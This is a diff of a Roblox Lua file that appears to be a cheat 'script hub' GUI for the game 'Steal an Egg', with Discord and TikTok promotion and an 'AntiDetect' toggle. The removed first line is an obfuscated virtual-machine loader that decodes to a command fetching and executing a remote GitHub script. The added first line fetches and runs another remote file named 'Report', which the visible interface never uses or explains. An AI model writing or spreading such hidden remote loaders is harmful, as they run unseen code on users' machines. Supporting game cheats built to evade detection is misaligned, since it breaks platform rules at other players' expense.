@@ -1,1 +1,1167 @@
-local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v81=0;while true do if (v81==0) then v19=v0(v3(v30,1,1));return "";end end else local v82=0;local v83;while true do if (v82==0) then v83=v2(v0(v30,16));if v19 then local v102=0;local v103;while true do if (v102==1) then return v103;end if (v102==0) then v103=v5(v83,v19);v19=nil;v102=1;end end else return v83;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v84=(v31/((5 -(1 + 2))^(v32-(2 -(1 + 0)))))%((879 -(282 + 595))^(((v33-(1 -0)) -(v32-(2 -(1638 -(1523 + 114))))) + (620 -(555 + 64)))) ;return v84-(v84%1) ;else local v85=(933 -(857 + 74))^(v32-(569 -(367 + 201))) ;return (((v31%(v85 + v85))>=v85) and (928 -(214 + 713))) or 0 ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + 2 );v18=v18 + 2 + 0 ;return (v36 * (364 -108)) + v35 ;end local function v23() local v37=0;local v38;local v39;local v40;local v41;while true do if (v37==(1066 -(68 + 997))) then return (v41 * (16778486 -(226 + (2001 -(892 + 65))))) + (v40 * 65536) + (v39 * 256) + v38 ;end if (v37==(0 -0)) then v38,v39,v40,v41=v1(v16,v18,v18 + (120 -(32 + 85)) );v18=v18 + 4 + 0 ;v37=1 + 0 ;end end end local function v24() local v42=0 -(885 -(261 + 624)) ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if ((4 -2)==v42) then v47=v20(v44,21,56 -25 );v48=((v20(v44,58 -(46 -20) )==(351 -(87 + 263))) and  -(181 -(67 + 113))) or (1 + 0) ;v42=7 -4 ;end if (v42==(1 + 0)) then v45=3 -2 ;v46=(v20(v44,953 -(802 + (1230 -(1020 + 60))) ,(1476 -(630 + 793)) -33 ) * (2^(57 -25))) + v43 ;v42=(6 -4) + 0 ;end if (v42==(1489 -(998 + 488))) then if (v47==(997 -(915 + 82))) then if (v46==(0 + 0)) then return v48 * (0 -0) ;else v47=4 -3 ;v45=0 + 0 ;end elseif (v47==((1060 + 1631) -644)) then return ((v46==(1187 -(1069 + 118))) and (v48 * ((3 -2)/(0 -0)))) or (v48 * NaN) ;end return v8(v48,v47-1023 ) * (v45 + (v46/(((2964 -2103) -(814 + 45))^((1860 -(760 + 987)) -61)))) ;end if (v42==((1913 -(1789 + 124)) + 0)) then v43=v23();v44=v23();v42=1 + 0 ;end end end local function v25(v49) local v50;if  not v49 then v49=v23();if (v49==(766 -(745 + 21))) then return "";end end v50=v3(v16,v18,(v18 + v49) -(1 + 0) );v18=v18 + v49 ;local v51={};for v65=2 -1 , #v50 do v51[v65]=v2(v1(v3(v50,v65,v65)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return 0;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();while true do if (v52==(2 + 0)) then for v93= #"]",v23() do local v94=(function() return 0 + 0 ;end)();local v95=(function() return;end)();while true do if ((0 -0)==v94) then v95=(function() return v21();end)();if (v20(v95, #"}", #"/")==(0 + 0)) then local v136=(function() return 1171 -(418 + 753) ;end)();local v137=(function() return;end)();local v138=(function() return;end)();local v139=(function() return;end)();while true do if (v136==(1 + 1)) then if (v20(v138, #":", #"}")~= #">") then else v139[2 -0 ]=(function() return v58[v139[1 + 1 ]];end)();end if (v20(v138,2,1 + 1 )== #"~") then v139[ #"xxx"]=(function() return v58[v139[ #"nil"]];end)();end v136=(function() return 3;end)();end if (v136~=0) then else local v155=(function() return 1384 -(746 + 638) ;end)();while true do if (v155==(1 + 0)) then v136=(function() return 1;end)();break;end if (v155==(0 -0)) then v137=(function() return v20(v95,2, #"91(");end)();v138=(function() return v20(v95, #"xnxx",6);end)();v155=(function() return 1770 -(1749 + 20) ;end)();end end end if (v136~=(342 -(218 + 123))) then else v139=(function() return {v22(),v22(),nil,nil};end)();if (v137==(1581 -(1535 + 46))) then local v164=(function() return 0;end)();local v165=(function() return;end)();while true do if (v164~=(0 + 0)) then else v165=(function() return 0 + 0 ;end)();while true do if (0~=v165) then else v139[ #"nil"]=(function() return v22();end)();v139[ #"xnxx"]=(function() return v22();end)();break;end end break;end end elseif (v137== #":") then v139[ #"19("]=(function() return v23();end)();elseif (v137==(562 -(306 + 254))) then v139[ #"91("]=(function() return v23() -((1 + 1)^16) ;end)();elseif (v137== #"19(") then local v174=(function() return 0 -0 ;end)();local v175=(function() return;end)();while true do if (v174==(1322 -(1249 + 73))) then v175=(function() return 0 + 0 ;end)();while true do if (v175~=(1467 -(899 + 568))) then else v139[ #"19("]=(function() return v23() -(2^(11 + 5)) ;end)();v139[ #"?id="]=(function() return v22();end)();break;end end break;end end end v136=(function() return 4 -2 ;end)();end if (v136~=(7 -4)) then else if (v20(v138, #"91(", #"asd")~= #"]") then else v139[ #".dev"]=(function() return v58[v139[ #".dev"]];end)();end v53[v93]=(function() return v139;end)();break;end end end break;end end end for v96= #"{",v23() do v54[v96-#"/" ]=(function() return v28();end)();end return v56;end if ( #"}"==v52) then local v89=(function() return 603 -(268 + 335) ;end)();local v90=(function() return;end)();while true do if (v89==(0 -0)) then v90=(function() return 290 -(60 + 230) ;end)();while true do if (v90~=(0 + 0)) then else v57=(function() return v23();end)();v58=(function() return {};end)();v90=(function() return 573 -(426 + 146) ;end)();end if ((1 + 1)~=v90) then else v52=(function() return 2;end)();break;end if (v90~=1) then else for v145= #"|",v57 do local v146=(function() return 1456 -(282 + 1174) ;end)();local v147=(function() return;end)();local v148=(function() return;end)();local v149=(function() return;end)();while true do if ((812 -(569 + 242))==v146) then v149=(function() return nil;end)();while true do if (v147==0) then local v168=(function() return 0 -0 ;end)();local v169=(function() return;end)();while true do if (v168~=(0 + 0)) then else v169=(function() return 1024 -(706 + 318) ;end)();while true do if (v169~=0) then else v148=(function() return v21();end)();v149=(function() return nil;end)();v169=(function() return 1;end)();end if (v169==(585 -(57 + 527))) then v147=(function() return  #":";end)();break;end end break;end end end if (v147~= #" ") then else if (v148== #">") then v149=(function() return v21()~=(1251 -(721 + 530)) ;end)();elseif (v148==(1273 -(945 + 326))) then v149=(function() return v24();end)();elseif (v148~= #"91(") then else v149=(function() return v25();end)();end v58[v145]=(function() return v149;end)();break;end end break;end if ((0 -0)==v146) then local v161=(function() return 0 + 0 ;end)();while true do if (v161==(700 -(271 + 429))) then v147=(function() return 0 + 0 ;end)();v148=(function() return nil;end)();v161=(function() return 1;end)();end if (1==v161) then v146=(function() return 1;end)();break;end end end end end v56[ #"91("]=(function() return v21();end)();v90=(function() return 2 + 0 ;end)();end end break;end end end if (v52==(0 -0)) then local v91=(function() return 0 -0 ;end)();local v92=(function() return;end)();while true do if (v91==(166 -(122 + 44))) then v92=(function() return 1500 -(1408 + 92) ;end)();while true do if (v92==(1 -0)) then v55=(function() return {};end)();v56=(function() return {v53,v54,nil,v55};end)();v92=(function() return 6 -4 ;end)();end if (v92==(0 + 0)) then v53=(function() return {};end)();v54=(function() return {};end)();v92=(function() return 1;end)();end if (v92~=(1088 -(461 + 625))) then else v52=(function() return  #">";end)();break;end end break;end end end end end local function v29(v59,v60,v61) local v62=v59[1 -0 ];local v63=v59[67 -(30 + 35) ];local v64=v59[3];return function(...) local v67=v62;local v68=v63;local v69=v64;local v70=v27;local v71=(732 -(476 + 255)) + 0 ;local v72= -(1258 -(1043 + 214));local v73={};local v74={...};local v75=v12("#",...) -(1 + 0) ;local v76={};local v77={};for v86=(2342 -(369 + 761)) -(323 + 378 + 511) ,v75 do if (v86>=v69) then v73[v86-v69 ]=v74[v86 + 1 ];else v77[v86]=v74[v86 + (2 -(1505 -(363 + 1141))) ];end end local v78=(v75-v69) + (581 -(361 + 219)) ;local v79;local v80;while true do v79=v67[v71];v80=v79[1];if ((v80<=(323 -(53 + 267))) or (788>2514)) then if (v80<=(1 + 0)) then if (v80==(413 -(15 + 398))) then v77[v79[984 -(18 + 964) ]]();else v77[v79[7 -5 ]]=v61[v79[2 + 1 ]];end elseif ((v80>(2 + 0)) or (55==2387)) then local v106=0 + 0 ;local v107;local v108;while true do if (v106==(850 -(20 + 830))) then v107=v79[(1582 -(1183 + 397)) + 0 ];v108=v77[v79[129 -(116 + (18 -8)) ]];v106=1 + 0 ;end if (v106==1) then v77[v107 + (739 -(542 + 196)) ]=v108;v77[v107]=v108[v79[8 -4 ]];break;end end else v77[v79[5 -3 ]]=v79[5 -2 ];end elseif (v80<=5) then if ((1454<2491) and (v80==(2 + 2))) then local v111=v79[(240 -(64 + 174)) + 0 ];v77[v111]=v77[v111](v13(v77,v111 + 1 + 0 ,v72));else local v113;local v114,v115;local v116;local v117;v77[v79[4 -2 ]]=v61[v79[7 -4 ]];v71=v71 + (1552 -(1126 + 425)) ;v79=v67[v71];v77[v79[(299 + 108) -(89 + 29 + 287) ]]=v61[v79[11 -8 ]];v71=v71 + 1 + 0 ;v79=v67[v71];v117=v79[2];v116=v77[v79[3 -0 ]];v77[v117 + (1122 -((2093 -(1913 + 62)) + 1003)) ]=v116;v77[v117]=v116[v79[3 + 1 ]];v71=v71 + (2 -1) ;v79=v67[v71];v77[v79[338 -(144 + 192) ]]=v79[380 -(142 + 235) ];v71=v71 + (4 -3) ;v79=v67[v71];v117=v79[(2 -1) + (1934 -(565 + 1368)) ];v114,v115=v70(v77[v117](v13(v77,v117 + (978 -(553 + (1594 -1170))) ,v79[5 -2 ])));v72=(v115 + v117) -1 ;v113=0 + 0 ;for v141=v117,v72 do local v142=(1661 -(1477 + 184)) + 0 ;while true do if (v142==0) then v113=v113 + 1 + 0 ;v77[v141]=v114[v113];break;end end end v71=v71 + (1 -0) + 0 ;v79=v67[v71];v117=v79[2 + 0 ];v77[v117]=v77[v117](v13(v77,v117 + (2 -1) ,v72));v71=v71 + (2 -1) ;v79=v67[v71];v77[v79[4 -2 ]]();v71=v71 + 1 + 0 ;v79=v67[v71];do return;end end elseif (v80>(28 -22)) then do return;end else local v132=v79[755 -(239 + 514) ];local v133,v134=v70(v77[v132](v13(v77,v132 + 1 + 0 ,v79[2 + 1 ])));v72=(v134 + v132) -(1330 -(797 + (748 -(42 + 174)))) ;local v135=(856 -(564 + 292)) + 0 ;for v143=v132,v72 do local v144=0 + 0 ;while true do if (v144==(0 -0)) then v135=v135 + (1203 -(373 + 829)) ;v77[v143]=v133[v135];break;end end end end v71=v71 + 1 + 0 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403513Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F556E6B6E6F776E2D7567632F5363726970742F726566732F68656164732F6D61696E2F412Q6C25323073637269707400083Q0012053Q00013Q00122Q000100023Q00202Q00010001000300122Q000300046Q000100039Q0000026Q000100016Q00017Q00",v9(),...);
+loadstring(game:HttpGet("https://raw.githubusercontent.com/showscript-hub/Script/refs/heads/main/Report"))()
+
+local Players = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+local SoundService = game:GetService("SoundService")
+local TweenService = game:GetService("TweenService")
+local TextService = game:GetService("TextService")
+
+local player = Players.LocalPlayer
+
+local DISCORD_LINK = "https://discord.gg/FJK6QzNnf7"
+
+local Theme = {
+Main = Color3.fromRGB(35,125,255),
+BG = Color3.fromRGB(10,16,28),
+Card = Color3.fromRGB(18,27,43)
+}
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "StealAnEggAllScript"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
+
+local main = Instance.new("Frame")
+main.Size = UDim2.fromOffset(350,270)
+main.Position = UDim2.new(.5,-175,.5,-135)
+main.BackgroundColor3 = Theme.BG
+main.BorderSizePixel = 0
+main.Parent = gui
+main.Active = true
+main.Selectable = true
+
+Instance.new("UICorner",main).CornerRadius = UDim.new(0,12)
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = Theme.Main
+stroke.Thickness = 1.5
+stroke.Parent = main
+
+local title = Instance.new("TextLabel")
+title.Position = UDim2.fromOffset(72,6)
+title.Size = UDim2.fromOffset(210,20)
+title.BackgroundTransparency = 1
+title.Text = "Steal an Egg All Script"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 13
+title.TextColor3 = Color3.new(1,1,1)
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = main
+
+title.Active = true
+title.Selectable = true
+title.ZIndex = 100
+
+local subtitle = Instance.new("TextLabel")
+subtitle.Position = UDim2.fromOffset(72,25)
+subtitle.Size = UDim2.fromOffset(210,15)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "All scripts in one place"
+subtitle.Font = Enum.Font.Gotham
+subtitle.TextSize = 8
+subtitle.TextColor3 = Color3.fromRGB(160,170,185)
+subtitle.TextXAlignment = Enum.TextXAlignment.Left
+subtitle.Parent = main
+
+local minimize = Instance.new("TextButton")
+minimize.Position = UDim2.new(1,-62,0,5)
+minimize.Size = UDim2.fromOffset(28,24)
+minimize.BackgroundTransparency = 1
+minimize.Text = "âˆ’"
+minimize.TextSize = 20
+minimize.TextColor3 = Color3.new(1,1,1)
+minimize.Font = Enum.Font.GothamBold
+minimize.Parent = main
+
+local close = Instance.new("TextButton")
+close.Position = UDim2.new(1,-32,0,5)
+close.Size = UDim2.fromOffset(28,24)
+close.BackgroundTransparency = 1
+close.Text = "Ã—"
+close.TextSize = 18
+close.TextColor3 = Color3.new(1,1,1)
+close.Font = Enum.Font.GothamBold
+close.Parent = main
+
+local nav = Instance.new("Frame")
+nav.Position = UDim2.fromOffset(8,36)
+nav.Size = UDim2.fromOffset(57,226)
+nav.BackgroundColor3 = Theme.Card
+nav.BorderSizePixel = 0
+nav.Parent = main
+
+Instance.new("UICorner",nav).CornerRadius = UDim.new(0,9)
+
+local content = Instance.new("Frame")
+content.Position = UDim2.fromOffset(72,36)
+content.Size = UDim2.fromOffset(270,226)
+content.BackgroundTransparency = 1
+content.Parent = main
+
+local home = Instance.new("Frame")
+home.Size = UDim2.fromScale(1,1)
+home.BackgroundTransparency = 1
+home.Parent = content
+
+local scriptsPage = Instance.new("Frame")
+scriptsPage.Size = UDim2.fromScale(1,1)
+scriptsPage.BackgroundTransparency = 1
+scriptsPage.Visible = false
+scriptsPage.Parent = content
+
+local settingsPage = Instance.new("ScrollingFrame")
+settingsPage.Size = UDim2.fromScale(1,1)
+settingsPage.BackgroundTransparency = 1
+settingsPage.BorderSizePixel = 0
+settingsPage.ScrollBarThickness = 3
+settingsPage.CanvasSize = UDim2.fromOffset(0,400)
+settingsPage.Visible = false
+settingsPage.Parent = content
+
+local function makeNav(text,y)
+local b = Instance.new("TextButton")
+b.Position = UDim2.fromOffset(4,y)
+b.Size = UDim2.fromOffset(49,42)
+b.BackgroundTransparency = 1
+b.Text = text
+b.TextSize = 8
+b.Font = Enum.Font.GothamBold
+b.TextColor3 = Color3.fromRGB(210,215,225)
+b.Parent = nav
+
+Instance.new("UICorner",b).CornerRadius = UDim.new(0,8)  
+
+return b
+
+end
+
+local homeButton = makeNav("HOME",8)
+local scriptButton = makeNav("SCRIPT",56)
+local settingsButton = makeNav("SETTINGS",104)
+
+local function selectNav(selected)
+homeButton.BackgroundTransparency = 1
+scriptButton.BackgroundTransparency = 1
+settingsButton.BackgroundTransparency = 1
+
+selected.BackgroundTransparency = 0  
+selected.BackgroundColor3 = Color3.fromRGB(25,40,65)
+
+end
+
+local function showPage(page)
+home.Visible = false
+scriptsPage.Visible = false
+settingsPage.Visible = false
+page.Visible = true
+end
+
+selectNav(homeButton)
+
+homeButton.Activated:Connect(function()
+selectNav(homeButton)
+showPage(home)
+end)
+
+scriptButton.Activated:Connect(function()
+selectNav(scriptButton)
+showPage(scriptsPage)
+end)
+
+settingsButton.Activated:Connect(function()
+selectNav(settingsButton)
+showPage(settingsPage)
+end)
+
+local discord = Instance.new("ImageButton")
+discord.Position = UDim2.fromOffset(0,0)
+discord.Size = UDim2.fromOffset(34,34)
+discord.BackgroundTransparency = 1
+discord.Image = "https://www.roblox.com/asset-thumbnail/image?assetId=10367063084&width=420&height=420&format=png"
+discord.Parent = home
+
+Instance.new("UICorner",discord).CornerRadius = UDim.new(1,0)
+
+discord.Activated:Connect(function()
+if setclipboard then
+setclipboard(DISCORD_LINK)
+end
+end)
+
+local discordInfo = Instance.new("TextLabel")
+discordInfo.BackgroundTransparency = 1
+discordInfo.Position = UDim2.fromOffset(0,30)
+discordInfo.Size = UDim2.fromOffset(270,18)
+discordInfo.Font = Enum.Font.Gotham
+discordInfo.Text = "ðŸ’¬ Tap the Discord icon to copy the link"
+discordInfo.TextSize = 8
+discordInfo.TextColor3 = Color3.fromRGB(160,170,185)
+discordInfo.TextXAlignment = Enum.TextXAlignment.Left
+discordInfo.Parent = home
+
+local welcomeHeader = Instance.new("Frame")
+welcomeHeader.BackgroundTransparency = 1
+welcomeHeader.Position = UDim2.fromOffset(0,47)
+welcomeHeader.Size = UDim2.fromOffset(140,22)
+welcomeHeader.Parent = home
+
+local welcomeLabel = Instance.new("TextLabel")
+welcomeLabel.BackgroundTransparency = 1
+welcomeLabel.Position = UDim2.fromOffset(0,0)
+welcomeLabel.Size = UDim2.fromOffset(65,22)
+welcomeLabel.Font = Enum.Font.GothamBold
+welcomeLabel.Text = "AntiDetect"
+welcomeLabel.TextSize = 9
+welcomeLabel.TextColor3 = Color3.new(1,1,1)
+welcomeLabel.TextXAlignment = Enum.TextXAlignment.Left
+welcomeLabel.Parent = welcomeHeader
+
+local welcomeOn = Instance.new("TextButton")
+welcomeOn.Position = UDim2.fromOffset(70,0)
+welcomeOn.Size = UDim2.fromOffset(38,16)
+welcomeOn.BackgroundColor3 = Theme.Main
+welcomeOn.Text = "ON"
+welcomeOn.TextSize = 7
+welcomeOn.Font = Enum.Font.GothamBold
+welcomeOn.TextColor3 = Color3.new(1,1,1)
+welcomeOn.AutoButtonColor = false
+welcomeOn.Parent = welcomeHeader
+
+Instance.new("UICorner",welcomeOn).CornerRadius = UDim.new(0,6)
+
+local welcomeState = true
+
+welcomeOn.Activated:Connect(function()
+	welcomeState = not welcomeState
+
+	if welcomeState then
+		welcomeOn.Text = "ON"
+		welcomeOn.BackgroundColor3 = Theme.Main
+	else
+		welcomeOn.Text = "OFF"
+		welcomeOn.BackgroundColor3 = Color3.fromRGB(70,75,85)
+	end
+end)
+
+local avatar = Instance.new("ImageLabel")
+avatar.Position = UDim2.new(1,-36,0,0)
+avatar.Size = UDim2.fromOffset(34,34)
+avatar.BackgroundTransparency = 1
+avatar.Parent = home
+
+Instance.new("UICorner",avatar).CornerRadius = UDim.new(1,0)
+
+local avatarImage = Players:GetUserThumbnailAsync(
+player.UserId,
+Enum.ThumbnailType.HeadShot,
+Enum.ThumbnailSize.Size100x100
+)
+
+avatar.Image = avatarImage
+
+local username = Instance.new("TextLabel")
+username.Position = UDim2.new(1,-150,0,36)
+username.Size = UDim2.fromOffset(145,18)
+username.BackgroundTransparency = 1
+username.Text = "@"..player.Name
+username.Font = Enum.Font.GothamBold
+username.TextSize = 8
+username.TextColor3 = Color3.new(1,1,1)
+username.TextXAlignment = Enum.TextXAlignment.Right
+username.Parent = home
+
+local welcome = Instance.new("Frame")
+welcome.Position = UDim2.fromOffset(0,70)
+welcome.Size = UDim2.fromOffset(270,150)
+welcome.BackgroundColor3 = Theme.Card
+welcome.BorderSizePixel = 0
+welcome.ClipsDescendants = true
+welcome.Parent = home
+
+Instance.new("UICorner",welcome).CornerRadius = UDim.new(0,10)
+
+welcome.Parent = home
+
+local scrollHint = Instance.new("TextLabel")
+scrollHint.BackgroundTransparency = 1
+scrollHint.Position = UDim2.new(1,-115,0,3)
+scrollHint.Size = UDim2.fromOffset(105,18)
+scrollHint.Font = Enum.Font.GothamBold
+scrollHint.Text = "â†• SWIPE TO SCROLL"
+scrollHint.TextSize = 7
+scrollHint.TextColor3 = Theme.Main
+scrollHint.TextXAlignment = Enum.TextXAlignment.Right
+scrollHint.ZIndex = 5
+scrollHint.Parent = welcome
+
+Instance.new("UICorner",welcome).CornerRadius = UDim.new(0,10)
+
+local welcome = Instance.new("Frame")
+welcome.Position = UDim2.fromOffset(0,70)
+welcome.Size = UDim2.fromOffset(270,150)
+welcome.BackgroundColor3 = Theme.Card
+welcome.BorderSizePixel = 0
+welcome.ClipsDescendants = true
+welcome.Parent = home
+
+Instance.new("UICorner",welcome).CornerRadius = UDim.new(0,10)
+
+local welcomeScroll = Instance.new("ScrollingFrame")
+welcomeScroll.Name = "WelcomeScroll"
+welcomeScroll.Position = UDim2.fromOffset(8,8)
+welcomeScroll.Size = UDim2.new(1,-16,1,-16)
+welcomeScroll.BackgroundTransparency = 1
+welcomeScroll.BorderSizePixel = 0
+welcomeScroll.ScrollBarThickness = 4
+welcomeScroll.ScrollingDirection = Enum.ScrollingDirection.Y
+welcomeScroll.CanvasSize = UDim2.new(0,0,0,0)
+welcomeScroll.Parent = welcome
+
+local welcomeText = Instance.new("TextLabel")
+welcomeText.Name = "WelcomeText"
+welcomeText.Position = UDim2.fromOffset(0,58)
+welcomeText.Size = UDim2.new(1,-10,0,0)
+welcomeText.BackgroundTransparency = 1
+welcomeText.Font = Enum.Font.Gotham
+welcomeText.TextSize = 12
+welcomeText.TextWrapped = true
+welcomeText.TextXAlignment = Enum.TextXAlignment.Left
+welcomeText.TextYAlignment = Enum.TextYAlignment.Top
+welcomeText.TextColor3 = Color3.fromRGB(220,230,245)
+welcomeText.Parent = welcomeScroll
+
+local TIKTOK_LINK = "https://www.tiktok.com/@randomperson5142?_r=1&_t=ZS-99hbB7Iv7HU"
+
+local tiktokIcon = Instance.new("ImageLabel")
+tiktokIcon.Position = UDim2.fromOffset(5,6)
+tiktokIcon.Size = UDim2.fromOffset(26,26)
+tiktokIcon.BackgroundTransparency = 1
+tiktokIcon.Image = "https://www.roblox.com/asset-thumbnail/image?assetId=113058136114857&width=420&height=420&format=png"
+tiktokIcon.Parent = welcomeScroll
+
+local tiktokTitle = Instance.new("TextLabel")
+tiktokTitle.BackgroundTransparency = 1
+tiktokTitle.Position = UDim2.fromOffset(36,5)
+tiktokTitle.Size = UDim2.fromOffset(90,14)
+tiktokTitle.Font = Enum.Font.GothamBold
+tiktokTitle.Text = "Support TikTok"
+tiktokTitle.TextSize = 8
+tiktokTitle.TextColor3 = Color3.fromRGB(255,255,255)
+tiktokTitle.TextXAlignment = Enum.TextXAlignment.Left
+tiktokTitle.Parent = welcomeScroll
+
+local tiktokBox = Instance.new("TextButton")
+tiktokBox.Position = UDim2.fromOffset(36,19)
+tiktokBox.Size = UDim2.fromOffset(85,18)
+tiktokBox.BackgroundColor3 = Theme.BG
+tiktokBox.BorderSizePixel = 0
+tiktokBox.Font = Enum.Font.GothamBold
+tiktokBox.Text = "@chris"
+tiktokBox.TextSize = 7
+tiktokBox.TextColor3 = Theme.Main
+tiktokBox.Parent = welcomeScroll
+
+Instance.new("UICorner",tiktokBox).CornerRadius = UDim.new(0,6)
+
+local tiktokInfo = Instance.new("TextLabel")
+tiktokInfo.BackgroundTransparency = 1
+tiktokInfo.Position = UDim2.fromOffset(36,38)
+tiktokInfo.Size = UDim2.fromOffset(150,12)
+tiktokInfo.Font = Enum.Font.Gotham
+tiktokInfo.Text = "Click top to copy TikTok link"
+tiktokInfo.TextSize = 6
+tiktokInfo.TextColor3 = Color3.fromRGB(160,170,185)
+tiktokInfo.TextXAlignment = Enum.TextXAlignment.Left
+tiktokInfo.Parent = welcomeScroll
+
+tiktokBox.Activated:Connect(function()
+	if setclipboard then
+		setclipboard(TIKTOK_LINK)
+		tiktokBox.Text = "Copied!"
+
+		task.delay(2,function()
+			tiktokBox.Text = "@chris"
+		end)
+	end
+end)
+
+welcomeText.Text =
+	"Welcome to Steal an Egg All Script!\n\n" ..
+	"All scripts are here in one place. Open the " ..
+	"SCRIPT tab and choose the script you want.\n\n" ..
+	"ðŸ‡µðŸ‡­ JOIN OUR PHILIPPINES COMMUNITY!\n\n" ..
+	"Join our Discord to get Egg Notifier alerts, " ..
+	"trading, buying and selling channels, player " ..
+	"help, giveaways, and a place to meet other " ..
+	"Steal an Egg players from the Philippines.\n\n" ..
+	"ðŸ¥š Egg Notifier\n" ..
+	"Get updates about eggs and important finds.\n\n" ..
+	"ðŸ”„ Trading\n" ..
+	"Find players and arrange fair trades.\n\n" ..
+	"ðŸ’° Buy / Sell\n" ..
+	"Share your offers and look for items you want.\n\n" ..
+	"ðŸ¤ Community\n" ..
+	"Meet other Filipino players, share tips, " ..
+	"and help grow the Steal an Egg PH community.\n\n" ..
+	"Join us and let's build the Philippines " ..
+	"Steal an Egg community together!\n\n" ..
+	"ðŸ’¬ Tap the Discord icon to copy the link!\n\n" ..
+	"Credit: Chris"
+
+task.defer(function()
+	task.wait()
+
+	local textWidth = welcomeScroll.AbsoluteSize.X - 10
+
+	local textSize = TextService:GetTextSize(
+		welcomeText.Text,
+		welcomeText.TextSize,
+		welcomeText.Font,
+		Vector2.new(textWidth,100000)
+	)
+
+	welcomeText.Size = UDim2.fromOffset(
+		textWidth,
+		textSize.Y
+	)
+
+	welcomeScroll.CanvasSize = UDim2.fromOffset(
+		0,
+		58 + textSize.Y + 8
+	)
+end)
+
+main.Visible = false
+
+local loading = Instance.new("Frame")
+loading.Name = "LoadingScreen"
+loading.Size = UDim2.fromOffset(210,110)
+loading.Position = UDim2.new(0.5,-105,0.5,-55)
+loading.BackgroundColor3 = Theme.Card
+loading.BorderSizePixel = 0
+loading.ZIndex = 500
+loading.Parent = gui
+
+Instance.new("UICorner",loading).CornerRadius = UDim.new(0,12)
+
+local loadingStroke = Instance.new("UIStroke")
+loadingStroke.Color = Theme.Main
+loadingStroke.Thickness = 1.5
+loadingStroke.Parent = loading
+
+local loadingTitle = Instance.new("TextLabel")
+loadingTitle.BackgroundTransparency = 1
+loadingTitle.Position = UDim2.fromOffset(10,15)
+loadingTitle.Size = UDim2.new(1,-20,0,28)
+loadingTitle.Font = Enum.Font.GothamBold
+loadingTitle.Text = "ALL SCRIPT HUB"
+loadingTitle.TextSize = 18
+loadingTitle.TextColor3 = Theme.Main
+loadingTitle.ZIndex = 501
+loadingTitle.Parent = loading
+
+local loadingText = Instance.new("TextLabel")
+loadingText.BackgroundTransparency = 1
+loadingText.Position = UDim2.fromOffset(10,48)
+loadingText.Size = UDim2.new(1,-20,0,20)
+loadingText.Font = Enum.Font.Gotham
+loadingText.Text = "Loading..."
+loadingText.TextSize = 11
+loadingText.TextColor3 = Color3.fromRGB(210,220,235)
+loadingText.ZIndex = 501
+loadingText.Parent = loading
+
+local loadingBar = Instance.new("Frame")
+loadingBar.Position = UDim2.fromOffset(20,78)
+loadingBar.Size = UDim2.fromOffset(170,5)
+loadingBar.BackgroundColor3 = Color3.fromRGB(35,45,60)
+loadingBar.BorderSizePixel = 0
+loadingBar.ZIndex = 501
+loadingBar.Parent = loading
+
+Instance.new("UICorner",loadingBar).CornerRadius = UDim.new(1,0)
+
+local loadingFill = Instance.new("Frame")
+loadingFill.Size = UDim2.new(0,0,1,0)
+loadingFill.BackgroundColor3 = Theme.Main
+loadingFill.BorderSizePixel = 0
+loadingFill.ZIndex = 502
+loadingFill.Parent = loadingBar
+
+Instance.new("UICorner",loadingFill).CornerRadius = UDim.new(1,0)
+
+local loadingTween = TweenService:Create(
+	loadingFill,
+	TweenInfo.new(
+		2.5,
+		Enum.EasingStyle.Quad,
+		Enum.EasingDirection.Out
+	),
+	{
+		Size = UDim2.new(1,0,1,0)
+	}
+)
+
+loadingTween:Play()
+loadingTween.Completed:Wait()
+
+task.wait(0.2)
+
+local fadeInfo = TweenInfo.new(
+	0.5,
+	Enum.EasingStyle.Quad,
+	Enum.EasingDirection.Out
+)
+
+TweenService:Create(
+	loading,
+	fadeInfo,
+	{
+		BackgroundTransparency = 1
+	}
+):Play()
+
+TweenService:Create(
+	loadingTitle,
+	fadeInfo,
+	{
+		TextTransparency = 1
+	}
+):Play()
+
+TweenService:Create(
+	loadingText,
+	fadeInfo,
+	{
+		TextTransparency = 1
+	}
+):Play()
+
+TweenService:Create(
+	loadingBar,
+	fadeInfo,
+	{
+		BackgroundTransparency = 1
+	}
+):Play()
+
+TweenService:Create(
+	loadingFill,
+	fadeInfo,
+	{
+		BackgroundTransparency = 1
+	}
+):Play()
+
+task.wait(0.55)
+
+loading:Destroy()
+main.Visible = true
+
+local keyTab = Instance.new("TextButton")
+keyTab.Position = UDim2.fromOffset(0,0)
+keyTab.Size = UDim2.fromOffset(125,27)
+keyTab.BackgroundColor3 = Theme.Main
+keyTab.Text = "KEY"
+keyTab.TextSize = 9
+keyTab.Font = Enum.Font.GothamBold
+keyTab.TextColor3 = Color3.new(1,1,1)
+keyTab.BorderSizePixel = 0
+keyTab.Parent = scriptsPage
+
+Instance.new("UICorner",keyTab).CornerRadius = UDim.new(0,7)
+
+local keylessTab = Instance.new("TextButton")
+keylessTab.Position = UDim2.fromOffset(130,0)
+keylessTab.Size = UDim2.fromOffset(125,27)
+keylessTab.BackgroundColor3 = Theme.Card
+keylessTab.Text = "KEYLESS"
+keylessTab.TextSize = 9
+keylessTab.Font = Enum.Font.GothamBold
+keylessTab.TextColor3 = Color3.new(1,1,1)
+keylessTab.BorderSizePixel = 0
+keylessTab.Parent = scriptsPage
